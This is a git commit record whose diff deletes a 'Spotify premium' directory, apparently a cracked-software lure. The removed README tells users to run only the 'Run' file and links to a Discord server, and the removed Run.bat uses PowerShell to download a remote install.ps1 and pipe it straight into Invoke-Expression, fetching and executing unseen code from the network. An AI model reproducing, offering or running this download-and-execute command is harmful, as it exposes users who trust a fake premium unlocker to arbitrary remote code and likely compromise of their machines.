a2fc218fbbd19bdfdfd641fa369cb3edf2b72e18
Jankovik <84988190+Jankovik@users.noreply.github.com>
2021-09-30 14:04:03 +0200

    Delete Spotify premium directory

--- Spotify premium/README.md
+++
@@ -1,7 +0,0 @@
-Spotify premium made by: Jankovik#4489
-
-
-RUN ONLY "RUN" FILE
-
-
-Any error: https://discord.gg/jW9ukwTPQq
--- Spotify premium/Run.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-powershell -Command "& {Invoke-WebRequest -UseBasicParsing 'https://data.cyverse.org/dav-anon/iplant/home/jankovik/install.ps1' | Invoke-Expression}"
-pause
-exit
